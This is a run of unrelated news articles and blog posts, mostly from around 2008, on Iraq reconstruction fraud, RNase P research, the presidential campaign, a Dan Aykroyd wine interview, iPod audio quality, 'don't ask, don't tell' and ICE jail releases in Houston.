Or from direct front ?
Nope .
I knew that I could n’t achieve the same visual effect manually drawing them each time , and anyway that would take forever , so I started experimenting with Blender :
Creating the characters was a really long work .
The 3D mesh had to be modeled and rigged .
Rigging is the process of creating a skeleton for the character , and assign the single vertexes of the mesh to the bones , so that moving the bones would give new postures to the character ( you do n’t want to alter the mesh geometry each time ) .
The first renders were n’t so great .
I was trying to achieve the same identical look that I had in the old style , but that proved to be almost impossible .
I got pretty close , tho , but it was n’t the same .
In the end , I tried to take the best of both worlds , drawing on top of the rendered scene .
Unfortunately , though , it ’s a really long process , and I ca n’t afford to do it all the times , now .
The 2D style had nicer and crisper colours , and the readers liked it more , so we ’re back to it again !
Concluding , being a programmer has a lot to do about the way you end up authoring a comic .
The urge to optimize will overtake the art , and the need to experiment will take you in weird places .
But after all it ’s been a great adventure so far !
Led by Laurent Lellouch of France 's Center for Theoretical Physics , the group of physicists used some of the world 's strongest supercomputers to establish the calculations for estimating the mass of protons and neutrons , the particles at the nucleus of atoms .
Proposed in his Special Theory of Relativity in 1905 , Albert Einstein 's e=mc2 formula shows that mass can be converted into energy and vice versa .
And although the theory has only now been corroborated , that has n't stopped it from being used frequently , perhaps most notably as the basis for building atomic weapons .
" Until now , this has been a hypothesis , " France 's National Center for Scientific Research ( CNRS ) said about Einstein 's equation in a press release .
The computations that the team of scientists worked out involved " envisioning space and time as part of a four - dimensional crystal lattice , with discrete points spaced along columns and rows . "
Not all enzymes that are assumed to require an RNA component in order to function do actually contain RNA , according to a study that focused on the enzyme RNase P. Contrary to accepted scientific theory , the project team from Vienna has long believed that certain forms of RNase P do not contain any RNA .
They say they have now succeeded in proving their point through a series of experiments and the results are published today in the journal CELL .
Although ribozymes are not quite living fossils , these enzymes , which function only in the presence of RNA , hail from a long gone age when biochemical processes were still controlled by RNA molecules .
It was only later that proteins came onto the molecular scene .
RNase P , an enzyme that modifies transfer RNAs , is one such RNA enzyme ( ribozyme ) .
All previously characterised forms of this enzyme confirmed assumptions about their RNA component .
Nevertheless , evidence has also been uncovered over the past 20 years that has cast doubt on the universality of this finding and indicated that this enzyme could be made up solely of proteins .
The experts certainly had plenty to debate .
RNase P : not everything is what it seems at the molecular level .
Graphic : 2MC Product Design / Walter Rossmanith
The debate seems to have been brought to an end , according to a group headed by Prof.
Walter Rossmanith at the Medical University of Vienna .
He says they have provided conclusive evidence by successfully identifying the components of human mitochondrial RNase P. Prof .
Rossmanith said , " RNase P is made up of three proteins that are solely responsible for the catalytic capacity of the enzyme without any RNA .
This discovery has not been made before because the enzyme breaks down easily during purification due to the loose connection between its components .
The approach we developed enabled us to get around this problem .
That was the breakthrough that enabled us to identify the proteins .
" Johann Holzmann , a PhD student and member of Prof .
Rossmanith 's team , explains further : " The most difficult task was to track down the proteins .
Everything started to move much faster once we had done that .
We produced the individual proteins separately in bacteria , purified them and then used them to reconstitute mitochondrial RNase P in vitro .
This finally removed any shadow of doubt for us - and CELL : mitochondrial RNase P does not contain RNA .
" The identification of the three proteins also resolved another previously unanswered question in molecular evolution research :
How is a ribozyme replaced by a protein enzyme ?
The answer provided by data collected during the project is that the protein - only mitochondrial RNase P developed in parallel to a pre-existing ribozyme .
Eventually , it replaced the latter .
It is interesting to note that the three protein components have been recruited from entirely different biochemical pathways and yet they have nevertheless retained their original functions .
Prof. Rossmanith adds : " We are also calling mitochondrial RNase P a patchwork enzyme , because it seems to be assembled from components available by chance at the time of its appearance in evolution .
" It is still unclear why only animal mitochondrial RNase P and not all ribozymes have been replaced by protein enzymes .
Indeed , the results of this successful FWF project have opened the door to a whole range of questions - and answers .

" My experience at the CPI provided me with a first - hand , up - close look at corruption and waste in Iraq .
Based on the cases that I have personally investigated , I believe that at least $ 18 billion have been lost in Iraq through corruption and waste -- more than half of which was American taxpayer money .
Of this $ 18 billion , I believe at least $ 4 billion have been lost due to corruption and criminal acts in the Ministry of Defense alone .
" Corruption in Iraq does not only waste American taxpayer dollars , however , corrupt Iraqi government officials have used American funds to support the Al - Qaeda terrorists , militias , and insurgents who are killing U.S. soldiers in Iraq . "
" During their audit of American reconstruction contracts , BSA officials uncovered ' ghost projects ' that never existed , projects that the Iraqi government deemed unnecessary , and work that was either not performed at all or done in a shoddy manner by both American and Iraqi contractors .
" To cite just one example from the BSA audit , approximately $ 24.4 million was spent on an electricity project in Ninawa Province that the BSA concluded existed only on paper .
While the BSA found that many of these projects were not needed -- and many were never built -- this very real fact remains : the billions of American dollars that paid for these projects are now gone . "
A hearing held Monday by the Democratic Policy Committee ( DPC ) and featuring former Iraqi officials revealed that more than $ 18 billion intended to rebuild Iraq may have been lost to local fraud and that millions have been funneled to al - Qaeda by corrupt Iraqis .
"
It is a matter of grave concern for those of us who are responsible for ensuring that American tax dollars are well spent , and not needlessly wasted on overpriced contracts , corrupt practices , poorly made products , or worse , passed along in the form of dollars or weapons directly into the hands of our enemies , " said Senator Robert Byrd ( D - WV ) , a member of the DPC .
" The ugly truth is that fraud , waste , and corruption are aiding and abetting our enemies in Iraq and contributing to terrorism elsewhere .
" The DPC hearing was highlighted by shocking insider accounts of corruption in Iraq , the effect on the disastrous U.S. mission there and the extent to which millions are going directly to al - Qaeda in Iraq to fund attacks on U.S. troops .
" It is all pretty sobering , " said Senator Byron Dorgan ( D - ND ) , who chairs the committee .
" Our country can not continue to be blind or oblivious to what is happening .
Taxpayers have been bled dry with massive misuse of public dollars . "
“ After more than five years in Iraq , we are still receiving reports that billions of U.S. taxpayer dollars sent to Iraq for reconstruction projects are still being wasted or stolen , ’’ said Senator Amy Klobuchar ( D - MN ) .
“ It is our soldiers on the front lines and the American taxpayers at home who are suffering the costs .
’’ The hearing featured two former high - level Iraqi government insiders , includingSalam Adhoob , a former chief investigator for Iraq 's Commission on Public Integrity ( CPI ) -- which is Iraq 's version of the FBI -- who told the committee that American taxpayer dollars are being stolen by corrupt Iraqi officials to enrich themselves and fund al - Qaeda .
Much of the money going to the terrorist group has ended up in banks in Jordan and other Middle - Eastern countries .
Here 's Adhoob , who worked at the Iraqi CPI from October 2004 to August 2007 and who supervised a team of 100 investigators , conducting more than 4,000 investigations : Adhoob , who fled Iraq fearing for his safety , said that over 30 of his coworkers were killed because of their involvement in fraud investigations .
" Allow me to state this as plainly as possible : there are powerful people in Iraq who do not want this story to be told , " he told the DPC panel .
" I investigated corruption in Iraq for three years , but eventually had to flee the country because of numerous death threats against me and my family .
There is every reason to believe that those threats would have been acted upon had I stayed in Iraq .
Thirty - one of my co-workers were murdered in retaliation against our efforts to investigate , arrest and convict corrupt officials in Iraq .
" And Adhoob talked about " ghost projects " investigated by his group that simply never existed or where both U.S. and Iraqi contractors did sub -par work .
Dorgan ended the day yesterday with a shot at the Bush administration , which has completely ignored fraud in Iraq and the cost to taxpayers in an already troubled American economy .
" I think it 's destructive of our efforts in Iraq and I think the Iraqi people know it , " said Dorgan .
" We heard today from former Iraqi officials talking about the lack of respect that the people of Iraq have for a government that comes in just shoveling money and turning a blind eye to corruption .
Turning a blind eye to corruption in Iraq is the same as sanctioning corruption in Iraq .
It undermines the American taxpayer and it provides danger for American troops .
This has to stop . "
Day Nine : A release date ?
Posted by Nicolas ( permalink )
Here we are , the last test session ended up yesterday , after yet another 4h of non -stop play .
Only a dozen of minor problems were found , and I even had the time to correct every single one of them today .
For the moment , the game is officially bug - free .
Of course , we all know a game can't be bug - free , especially when we 're only testing it during our spare time , without any professional means of some sort .
But we believe we reached a fairly mature stage .
To conclude , the beta version is nearly finished .
For the moment , we 're working on the last map , tweaking things a bit , adding details and reducing the overall difficulty and complexity ( to understand what one must do ) .
There 's still some changes to overtake , but with this last map , we 're already flirting with the limits of the engine , we must be careful .
So , I believe we can unveil the real release date , because we think that we 'll have plenty of time to polish things up until this date .
When we published our first news , we said " somewhere around the end of september or the beginning of october " .
It appears it will more likely be on the beginning of october .
Now it 's rather official , we plan to release the whole thing on the first birthday of the Orange Box .
October 10th .
As an engineer , if you want to piss off someone who is asking you whether you can or ca n’t build a thing , just say , “ Given enough time , I can build anything ” .
They ’ll believe you ’re dodging the question , and they ’ll think you ’re arrogant .
As a means of negotiating a schedule or a feature , this answer is not helpful .
You need to take the time to explain your thinking to this person .
You need to walk them through your development process .
It ’s an opportunity to educate and not come off like a jerk .
However .
Given enough time , an engineer can build anything .
I ’m optimistic .
And I hire optimists .
Like any profession , software development is chock full of radically different personalities , but I want the optimists .
I ’m not looking for Yes - folk ; I ’m looking for those folks who , when backed into a corner with a gun to their heads , respond with , “ Fuck it , we ’re going to figure it out ” .
This base optimism can be hidden in all types of personalities , but when the shit hits the fan it shows up and often creates the impossible .
In my two decades of working in Silicon Valley , I am happy to confirm that this valley is full of these insane optimists .
These are people who :
Work hard
Over -commit and still deliver
Rampantly go out of their way to help each other
Have a track record of stunning success
This is not a population limited to the valley , it ’s a population spread across the country and across the globe , but today I ’m thinking about my country .
We ’re nowhere near the bottom of this disaster we ’ve voted onto ourselves .
I do n’t think the majority of Americans fully understand the severity of our financial crisis .
We ’re all fervently staring at Christmas , confusing the holiday spirit for hope .
Yet , I remain optimistic .
Regardless of who wins the election , the question remains , “ Do we have it in us to re-invent ourselves ?
Can we rebuild our country into a place we respect ? ”
Yes , we can .
I live on the west coast of the United States , which is a region pioneers traveled to so they could choose how to define their home , but this whole country is built on that idea — we choose who we will be .
Where I sit , with the cranky engineers – the insane optimists — I hope we all share this optimism because , given enough time , we can build anything .

Alaska Gov. Sarah Palin , campaigning in Marietta , Ohio , on Sunday , tried to scare coal - state voters by suggesting the San Francisco Chronicle had concealed an audiotape of Sen.
Barack Obama explaining " his plan " to bankrupt the industry .
" Why is the audio tape just now surfacing ? " Palin asked .
" This interview was given to San Francisco folks many months ago .
You should have known about this , so that you would have better decision - making information as you go into the voting booth . "
Shouts of " liberal media " could be heard in the crowd .
Shame on Sarah Palin .
She should examine the facts before lifting her talking points from the right - wing blogs .
First of all , that audiotape is not " just now surfacing . "
It has been available for the world to hear - and was heavily promoted by us - ever since our Jan. 17 editorial board meeting with Obama .
Other campaigns , including Sen. Hillary Rodham Clinton 's and Sen. John McCain's , had ample opportunity to review Obama 's remarks about coal , and challenge him on them before the closing days of the general election .
None did .
You can hear the full editorial board interview at sfgate.com / ZCGA .
Obama 's remarks on coal ( which come with about 23 minutes remaining ) were in the context of a question about balancing his support for coal with the need to reduce carbon emissions .
Obama hardly sounded like a man determined to shut down the industry .
What the Illinois senator offered was a textured explanation of his determination to encourage cleaner coal technologies .
" This notion of no coal , I think , is an illusion , " he said at one point .
" You gotta listen to the tape , " Palin told the crowd Sunday .
On that point , we agree .

One wild and crazy winemaker 1 / 1 Back to Gallery
So what 's the deal with so many celebrities going into the wine biz ?
Dan Aykroyd , the former " Saturday Night Live " comedian and actor , is just about to release his 2007 Russian River Valley Chardonnay and Cabernet Sauvignon - his first California wine project .
He teamed up with DeLoach Vineyards ' winemaking team and has added the Sonoma County wines to his Discovery Series .
He plans to put the bottles on California shelves by Christmas .
" I want it to jump around a little like a Mexican jumping bean in the center of your tongue , " says Aykroyd , who worked hand in hand with the winery in producing the varietals .
But this is not the funnyman 's first foray into the liquor cabinet .
In 2007 he launched the Discovery Series in Canada , which includes Chardonnay , Cabernet Merlot , Sauvignon Blanc , Cabernet Shiraz and ice wine made with grapes from Niagara .
He 's also an investor in Diamond Estates Wines & Spirits , a Canadian distribution company .
Aykroyd , a native of Canada , was one of the original members of the " Saturday Night Live " cast .
The writer - comedian launched to fame with such recurring roles as Fred Garvin , male prostitute ; one of the two " wild and crazy guys " ; and a newscaster on the " Weekend Update " with Jane Curtain - it 's where he said his famous line , " Jane , you ignorant slut . "
Later he went on to star in such blockbusters as " The Blues Brothers , " " Trading Places " and " Ghostbusters . "
Aykroyd lives in Los Angeles , where he continues to work on his syndicated House of Blues radio show , which has been going for 16 years .
He says between the show and his other business ventures , he does n't have time to do movies anymore .
But wine is a whole different story .
Q: What got you interested in wine ?
A : My wine story starts at a purple Jesus party .
It 's where we mixed Manischewitz and Mogan David together and the next morning woke up praying to Jesus .
Actually , it was while we were filming the movie " The Blues Brothers . "
Band member Steve Cropper brought me up to his house on Mulholland Drive , where he had a huge cellar and turned me on to the big fat red wines .
Q: What was the first great wine you remember having ?
A : It was up at Steve 's , a French Chateau Brane - Cantenac red .
Q: What wine do you think people do n't drink enough ?
A : I think the Cabs have been left behind by the Pinots .
I like Fumé Blancs and unoaked Chardonnays .
Q: If you were on death row and the warden let you have one glass of wine , what would it be ?
A : First I would have a glass of nice Chardonnay with an iceberg wedge salad with blue cheese dressing .
Then I would move on to a T - bone steak , green peas , mashed potatoes and my own Cabernet .
Q: You only get one glass .
There 's a limit on death row .
A : They would do pairings for me in prison .
The warden and I are close .
I killed all the child molesters .
Q: OK then , what else ?
A : For dessert , black forest cake with my ice wine and then I 'd finish it off with Patron XO with milk and a nice cigar .
Q: How many wines are in your cellar ?
A : Not too many .
In Canada my cellar is depleted .
Here ( in Los Angeles ) , 150 bottles because I entertain so much .
Q: If you could share one bottle of great wine with a current cast member of " Saturday Night Live , " what and who would it be ?
A : A nice bottle of pink Champagne with Will Forte .
He 's a cultured man .
We 'd have it with roasted potatoes and buffalo burgers .
Q: If you could share one bottle of great wine with a blues singer what and who would it be ?
A : Well , Ella ( Fitzgerald ) of course .
I would bring her a nice , soft , red Burgundy for her pipes .
Q: What is Elwood Blues ' favorite wine ?
A : Definitely Boone 's Farm Green Ginger wine .
It 's 110 percent alcohol .
Who Won the Last Presidential Debate ?
Instead of giving you my thoughts on the latest presidential debate I thought that I would use a brand new wordpress feature .
I would like to know who you thought won the debate .
Audio engineering types the world over are devising ways to test the sound quality of Apple 's new iPod Classic , because it 's massive capacities ( 80 GB or 160GB ) and support for high - quality codecs ( Apple Lossless , WAV , AIFF ) make it the natural choice for people who are serious enough about audio quality to include their listening equipment in their signature files .
One of the most comprehensive tests was done by Marc Heijligers , a professional audio PhD .
He admits his test was somewhat compromised by using a laptop input to record test signals from the iPods , but since he used the same input for both the 6G iPod Classic and the 5G / 5.5G iPod and managed to turn up significant differences , the test appears to be valid .
It paints the new iPod Classic as a possible downgrade in terms of sound quality – at least as far as golden - eared audiophiles are concerned ( some of these people spend hundreds of dollars per speaker wire ) .
Images of cracked open iPod Classics reveal that it has a cleaner signal path from the digital - analog - converter ( DAC )
chip to the line - out jack , so the problem , such as it is , appears to be with the Cirrus chip Appleused for the Classic as opposed to the Wolfson chip found in the 5G / 5.5G iPods .
Everyone 's ears are different , but Heijligers ' test found three problem areas :
- A slight uplift in treble [ boosted high frequencies ] -
A group delay that depends on frequency [ fuzzy 3D image ] -
A strong modulation with 22.1 k , causing intermodulation distortion [ distortion ]
Depending on where the problem lies ( assuming it 's actually a problem – some people think the 6G iPod Classic sounds warmer and crisper ) , Apple might be able to fix it with a firmware upgrade .
According to Heijlifers , version 1.0.1 of the firmware did not resolve the issue .

And now for the preliminary political post - mortems of John McCain ’s failed bid for the presidency .
The Wall Street Journal this morning analyzes what went wrong and the conclusion seems clear : McCain badly bungled his response to the financial crisis .
It was never going to be easy for McCain .
As the chosen candidate of the incumbent party , economic woes were bound to weigh him down .
But a more agile campaign might have made the crisis work to its advantage .
Instead , McCain ’s campaign seems to have freezed up at every turn , allowing Barack Obama to define the issues .
Here are our top five McCain Missteps .
McCain suspended his campaign on September 24th to deal with the financial crisis .
This created huge expectations that McCain would come forward with a bold plan .
McCain defied these expectations by largely remaining silent at the White House crisis summit and staying behind the scenes during the bailout debate , leaving conservative House Republicans to fight the battle over the bill .
Principled opposition that adopted the stance that failed firms should not be bailed out , drawing a line between those faced with a solvency crisis and a liquidity crisis , would not only have made economic sense , it would have allowed McCain to top into public outrage at tax - dollars going into the coffers of billionaires .
Instead of developing a solution for the crisis or at least frankly addressing public fears , McCain attempted to adopt a populist stance against Wall Street greed .
This was pure hooey , of course .
Greed had n’t suddenly reared up like a monster from the Atlantic and swallowed Wall Street .
The roots of the problem was n’t the motive — greed has been and shall always be with us — but the means : inflating homeownership , government sponsored securitization , loose money policies , unleashed agency costs , errant accounting regulations , mismanagement , etc .
When McCain finally did present a plan to address the financial crisis , it seemed as if he had thought it up on the spot during a presidential debate .
His economic advisers could n’t even explain the mechanics .
It was the opposite of statesmanship .
It was words untethered to either a plan or reality .
McCain completely dropped the one issue that might have appealed to businesses , investors and aspirational Americans yearning to be wealthy .
We ’re talking , of course , about taxes .
McCain was officially for cutting capital gains and corporate taxes , but at nearly every turn he refused to talk about these positions .
Joe the Plumber should have been a representative of the tax burden on America ’s small businesses ; instead McCain fled into abstractions about “ redistribution . ”
Instead of talking about tax cuts , McCain consistently said he would “ keep taxes low , ” which is as uninspirational ( “ No Change ! ” ) as it is nonsensical .
Were we expected to believe that the Democratic Congress and George Bush had arrived at the perfect tax rate ?
If not , why not change it ?
Obama actually got out to his right on income taxes , promising a tax cut for most Americans .
What Republican candidate could hope to win by battling a Democratic tax - cut armed with nothing other than a sour face and dour talk ?
The leaders of the Republican party should not forget that their candidate was virtually with Obama before McCain bungled the bailout , the economy and taxes .
But , being politicians , we suppose they probably will .
Especially if they can just as easily blame that woman from Alaska .

Seven of Britain 's largest music download sites have got together to promote a new " MP3 compatible " logo .
It aims to raise the profile of the open MP3 music format and show people what they can do with their downloads .
The trade body behind the initiative said it should also help consumers identify legal sites .
The Entertainment Retailers Association devised the logo , which emphasises the fact that MP3 files can be played on any digital player .
Boom time HMV , Woolworths , 7digital , Digitalstores , Tescodigital , Tunetribe , and Play.com have all signed up to the scheme , which will show consumers that the MP3 download will play on PCs , Macs , and portable music players .
According to October figures from the Official UK Charts Company , single track downloads were up 41 % and album downloads increased 69 % from the previous year .
You are not locked in to a relationship with a single retailer or hardware manufacturer
Ben Drury , 7digital.com 7digital 's Ben Drury said that online sales " have been booming " because users " love the freedom of MP3 " .
" The beauty of an MP3 file is that once you have bought it , you do n't need to be a computer genius or a lawyer to make it work and you are not locked in to a relationship with a single retailer or hardware manufacturer , " he said .
The British record industry 's trade association , the BPI , is also backing the scheme .
Geoff Taylor , BPI chief executive , said : " This logo will not only help give consumers confidence that the music files they are buying will play on a wide range of devices , but will also help them know that they are legal and that artists are getting paid . "
It is hoped the MP3 - compatible logo will form the blueprint of an international standard and ERA is also seeking support from manufacturers of MP3 - compatible digital music players .

EXCLUSIVE :
President - elect Barack Obama will not move for months , and perhaps not until 2010 , to ask Congress to end the military ’s decades - old ban on open homosexuals in the ranks , two people who have advised the Obama transition team on this issue say .
Repealing the ban was an Obama campaign promise .
However , Mr. Obama first wants to confer with the Joint Chiefs of Staff and his new political appointees at the Pentagon to reach a consensus and then present legislation to Congress , the advisers said .
“ I think 2009 is about foundation building and reaching consensus , ” said Aubrey Sarvis , executive director of the Servicemembers Legal Defense Network .
The group supports military personnel targeted under the ban .
Mr. Sarvis told The Washington Times that he has held “ informal discussions ” with the Obama transition team on how the new president should proceed on the potentially explosive issue .
Lawrence Korb , an analyst at the Center for American Progress and an adviser to the Obama campaign , said the new administration should set up a Pentagon committee to make recommendations to Congress on a host of manpower issues , including the gay ban .
“ If it ’s part of a larger package , it has a better chance of getting passed , ” he said .
The Obama transition team did not reply to a request for comment .
The incoming administration is well aware of how President Clinton botched the same issue 15 years ago .
Shortly after taking office in 1993 , the president ordered the Pentagon to rescind the regulation that excluded gays .
On Capitol Hill , Republicans , and some leading Democrats , including then - Senate Armed Services Committee Chairman Sam Nunn of Georgia , objected .
Retired military officers and a number of pro-military conservative activist groups joined the fight .
Mr. Clinton backed off .
Congress ended up enacting the ban into law as part of U.S. Title 10 which regulates the military .
As a compromise , the White House and congressional leaders wrote a new policy known as “ do n’t ask , do n’t tell . ”
Under it , gay service members must keep their sexuality private or face expulsion .
About 12,500 people have been discharged under the policy .
Today , gay activists cite national polls that show public sentiment , unlike in 1993 , support removing the ban .
Mr. Sarvis expressed optimism that Democratic gains in the past two elections make it “ more likely ” Congress will let gays serve openly .
“ I think the congressional results are a factor in our optimism , ” he said .
He added that no vote count has been taken .
Delaying the congressional vote a year would give the White House time for consultation , but it would also let ban proponents organize and possibly sway public opinion , as they did in 1993 .
“ Homosexual activists are overconfident because they have not yet seen a counterforce emerge as occurred in 1993 , ” said Robert Knight , director of the Culture and Media Institute at the Media Research Center , an organization that seeks to balance perceived liberal bias in mainstream news coverage .
“ But as the threat grows stronger , we will see groups forming and the resistance building , ” he said .
“ Americans go about their business and are not activists until they have a Pearl Harbor moment .
That has yet to happen , but it will . ”
He added that most Americans “ are unaware that gay activists have the military in their gun sights . ”
Mr. Obama ’s gay - ban pledge was not a major campaign issue .
However , he provided a policy statement to the Human Rights Campaign , the largest U.S. gay rights group , pledging to repeal the exclusion and to invite back service members discharged under the law .
He also said that he wants the Pentagon to school military people on how to treat gays .
“ The eradication of this policy will require more than just eliminating one statute , ” he told the group , in a statement posted on their Web site .
“ It will require the implementation of anti-harassment policies and protocols for dealing with abusive or discriminatory behavior as we transition our armed forces away from a policy of discrimination .
The military must be our active partners in developing those policies and protocols . ”
The law states that open homosexuality in the ranks would be detrimental to combat unit readiness .
“ The presence in the armed forces of persons who demonstrate a propensity or intent to engage in homosexual acts would create an unacceptable risk to the high standards of morale , good order and discipline , and unit cohesion that are the essence of military capability , ” the law says .
Ban proponents say removing the restriction would hurt recruiting by discouraging conservative , religiously oriented youths from signing up .
“ It ’s true that many in the military have looked the other way and served alongside people they know are into homosexuality , ” Mr. Knight said .
“ But that is with the ban in place .
Open acceptance would change the atmosphere entirely .
If fraternization is a problem now between men and women , imagine the conflicts with openly gay officers who no longer have to be reticent . ”
Mr. Sarvis said not to look for the debate to begin until late next year or 2010 .
“ What ’s the reality for the new administration ? ” he said .
“ Financial crisis .
Economic upheaval .
Health care reform .
Environmental challenges .
Where does ‘ do n’t ask , do n’t tell ’ fall in all this ?
I would say it is not in the top five priorities of national issues . ”

Violent criminals in U.S. illegally go free in Houston A system 's fatal flaws
Thousands of inmates admit they 're in the U.S. illegally , but even those convicted of violent crimes are often released right back onto Houston 's streets
Inmates are interviewed by jailers in the booking office at the Harris County Jail , where officers maintain a database of inmates who tell jailers during booking that they are in the U.S. illegally .

Federal immigration officials allowed scores of violent criminals — some ordered deported decades ago — to walk away from Harris County Jail despite the inmates ' admission to local authorities that they were in the country illegally , a Houston Chronicle investigation found .
A review of thousands of criminal and immigration records shows that Immigration and Customs Enforcement officials did n't file the paperwork to detain roughly 75 percent of the more than 3,500 inmates who told jailers during the booking process that they were in the U.S. illegally .
Although most of the inmates released from custody were accused of minor crimes , hundreds of convicted felons — including child molesters , rapists and drug dealers — also managed to avoid deportation after serving time in Harris County 's jails , according to the Chronicle review , which was based on documents filed over a period of eight months starting in June 2007 , the earliest immigration records available .
Other key findings in the investigation include :
• In 177 cases reviewed by the Chronicle , inmates who were released from jail after admitting to being in the country illegally later were charged with additional crimes .
More than half of those charges were felonies , including aggravated sexual assault of a child and capital murder .
• About 11 percent of the 3,500 inmates in the review had three or more prior convictions in Harris County .
Many had repeatedly cycled through the system despite a history of violence and , in some cases , outstanding deportation orders .
The investigation found that the federal government 's system to identify and deport illegal immigrants in Harris County Jail is overwhelmed and understaffed .
Gaps in the system have allowed some convicted criminals to avoid detection by immigration officials despite being previously deported .
The problems are national in scope , fueled by a shortage of money and manpower .
In reaction to the Chronicle 's findings , U.S. Rep .
Ted Poe , R - Humble , said ICE needs more resources to target immigrants convicted of crimes .
" There 's no question about it , " Poe said .
" Criminals from foreign countries who get caught after committing a crime and prosecuted should go to the top of the list of people we deport . "
ICE removed 107,000 convicted criminals from the U.S. in the 2008 fiscal year , which ended in September .
But during the same time frame , ICE sent home more than two times as many illegal immigrants without criminal records , prompting criticism from some members of Congress .
Kenneth Landgrebe , ICE 's field office director for detention and removal in Houston , said officials are doing the best they can with the resources they have .
ICE trained nine Harris County jailers this summer through a federal program that empowers local law enforcement to act as immigration agents .
The Houston ICE office set a record by removing 8,226 illegal immigrants with criminal records from Southeast Texas last year , an increase of about 7.5 percent from fiscal 2007 .
" No agency has enough law enforcement officers to do the job the way they 'd like , " Landgrebe said .
" If you look at law enforcement in general — at Houston or New York City or Los Angeles police — do they apprehend every criminal that commits a crime ?
No .
Do they arrest every person that speeds in a traffic zone ?
No .
" We have to prioritize what we handle , " Landgrebe said .
Missed opportunities
ICE officials estimated that between 300,000 and 450,000 inmates incarcerated in the U.S. are eligible for deportation each year .
Though ICE has improved screening in federal and state prisons in recent years , the agency estimates it screens inmates in only about 10 percent of the nation 's jails .
This spring , ICE officials announced a plan to identify and deport the most serious offenders in the nation 's prisons and jails , estimating it would cost between $ 930 million and $ 1 billion and take about 3 1/2 years .
Congress is pressuring ICE to move faster .
" The present situation is unacceptable , " said Rep. David Price , D - N.C. , chairman of the House Homeland Security appropriations committee .
" The highest priority for ICE should be deporting people who have proven their ability and their willingness to do us harm .
Immigration is a very , very contentious issue , but this seems to be one thing almost everyone agrees is a priority . "
Yet , the Chronicle 's review found hundreds of missed opportunities to deport convicted criminals , perpetuating a cycle of crime and violence .
• Armando De La Cruz , a Mexican national , told jailers on two occasions in 2007 that he was undocumented .
Both times , he was convicted of assaulting his wife and released after serving his jail time .
De La Cruz is now back in Harris County Jail , charged with raping a woman at knife point behind a southeast Houston apartment complex in July , and attempting to rape another woman less than a week later .
His defense attorney , Ricardo Gonzalez , did not return phone calls .
• Pedro Alvarez , a convicted sex offender from El Salvador who was first deported in 1991 , racked up eight convictions in Harris County over a span of two decades and was allowed to walk free from jail multiple times — as recently as the spring of 2007 .
Immigration officials finally charged him with re-entry after deportation in February .
Sandra Zamora Zayas , the attorney who represented Alvarez in federal court in South Texas , did not return phone messages .
" It 's just amazing how long it took them to catch up with him , " the mother of a 5 - year - old girl Alvarez sexually assaulted in 1988 said in an interview with the Chronicle , after learning about Alvarez 's extended criminal history .
' Never lied about who I am '
Miguel Mejia Rodriguez , 36 , is locked up on the fifth floor of the San Jacinto Jail downtown , accused of raping and sodomizing a second - grader .
It is the fourth time in 12 years that Rodriguez , an unemployed drifter from Zacatecas , Mexico , has landed in Harris County Jail .
Over the years , Rodriguez has served time for drug possession , theft , trespassing and indecent exposure .
He told jailers he was in the country illegally in December 2006 , after a security guard caught him touching himself in an apartment complex parking lot , records show .
But ICE officials did not file paperwork to detain Rodriguez .
He was released after serving his 25 - day sentence .
" I never lied about who I am , or where I 'm from .
I 'm 100 percent Mexican , " Rodriguez said in a jail interview with the Chronicle in September , after he was accused of the rape and sodomy of a 7 - year - old .
According to court records , the girl told a friend Rodriguez started abusing her after her mother died in 2005 , while he was living with her family .
The girl was hospitalized and treated for syphilis , court records show .
In an interview with Houston police detectives , Rodriguez admitted to contracting syphilis from a woman he met in a Houston cantina , but he denied raping the girl .
He said she was a " troublemaker " who lied because he punished her when she misbehaved .
When he was arrested on the sexual assault charge in July 2007 , Rodriguez again told jailers he was in the country illegally , records show .
In June , nearly a year after his arrest , ICE officials filed paperwork to detain Rodriguez , who is scheduled for trial in December .
Deadly consequences
Katherine Anne Bridges , deaf and mute , was just 19 in the fall of 2004 when she told Harris County authorities that Jeremias Fuentes , her boyfriend , tried to grab their 6 - month - old baby boy from her arms and kicked her in the face .
He hid her emergency phone so she could n't call for help .
Fuentes was sentenced to 20 days in jail .
Nearly three years later , in August 2007 , Fuentes was arrested again , suspected of interfering with case workers trying to interview Bridges about abuse allegations .
Fuentes , 36 , told jailers he was an illegal immigrant from El Salvador , records show .
He was sentenced to 30 days in jail .
He was released after ICE did n't file paperwork to detain him .
On the morning of Nov. 26 , 2007 , a medical examiner puzzled over the writing scrawled on Bridges ' palm .
It read in part : " Payback because ... help me . "
The evening before , Bridges ' body had been found facedown in the bedroom closet of her southwest Houston apartment complex .
She had blood in her brown hair and a dozen stab wounds on her face , neck , chest and back .
A knife rested on the baby crib .
Detectives questioned Fuentes , who admitted he stabbed Bridges , but he said it was self - defense .
In December , immigration officials filed the paperwork to detain Fuentes , who declined a request for a jail interview .
He is scheduled for trial in February .
Andy Kahan , director of the Houston Mayor Crime Victims Office , said he hoped Bridges ' case could be a ' ' catalyst for change " and encourage local authorities to work more closely with ICE to ensure inmates with violent criminal histories are vetted before release .
" There were numerous opportunities to do the correct thing , and that 's have him deported , and that did n't happen .
And as a result , a woman paid dearly with her life , " Kahan said .
Matthew Baker , an assistant field office director for ICE in Houston , said agents try to screen out as many violent criminals as possible to avoid preventable crimes .
Many illegal immigrants are identified by ICE in the state 's prison system , he added , even if they are not caught while in jail .
" No one can measure the cases where we picked up and removed someone and prevented that carjacking or that drunk driving accident that kills a family , " Baker said .
" There are hundreds of thousands of incidents that we prevent every year ; those are not measured because they do n't happen . "
Facts vs. fears
While the Chronicle 's review found cases involving hardened criminals who slipped through the deportation net , the investigation also revealed that 43 percent of suspects who were arrested and admitted being in the country illegally were charged with misdemeanors and had no prior criminal record in Harris County .
Immigrant advocates cautioned against stereotyping illegal immigrants based on high - profile cases .
Most research has found that recent immigrants are far less likely than their U.S. - born counterparts to commit crimes and end up in prison .
In Texas , foreign nationals made up approximately 15 percent of the state 's population in 2005 , and about 7 percent of state prison offenders .
" Many people see it as a profound insult when someone who is here without permission commits a heinous crime , " said Rebecca Bernhardt , director of policy development for the American Civil Liberties Union of Texas .
" To be outraged at the individual who committed that crime is an appropriate response .
But to be angry at everybody who is just here trying to work to support their family and comes from the same background as that defendant is a mistake . "
Asking about status
The nation 's system for identifying and deporting immigrants convicted of crimes is largely secretive .
ICE officials refuse to disclose the names or basic immigration history of people detained and marked for deportation , citing privacy protections in federal law .
To better understand how ICE screens inmates , the Chronicle obtained a copy of a database , maintained by the Harris County Sheriff 's Office , of inmates who tell jailers during booking that they are in the U.S. illegally .
